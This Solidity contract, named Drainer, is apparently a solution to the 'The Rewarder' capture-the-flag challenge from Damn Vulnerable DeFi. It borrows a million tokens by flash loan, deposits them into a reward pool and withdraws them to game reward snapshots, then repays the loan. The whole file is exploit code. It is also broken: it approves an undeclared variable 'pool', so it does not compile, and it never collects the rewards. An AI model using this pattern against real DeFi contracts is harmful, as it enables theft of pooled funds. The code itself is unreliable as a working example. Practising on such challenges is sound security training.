pragma solidity ^0.6.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract Drainer {
    FlashLoanerPool loanerPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken token;

    constructor(address _loanerPool, address _rewarderPool, address _token) public {
        loanerPool = FlashLoanerPool(_loanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        token = DamnValuableToken(_token);
    }

    function attack() public {
        loanerPool.flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 loanAmount) external {
        token.approve(address(pool), loanAmount);
        rewarderPool.deposit(loanAmount);
        rewarderPool.withdraw(loanAmount);
        token.transfer(msg.sender, loanAmount);
    }
}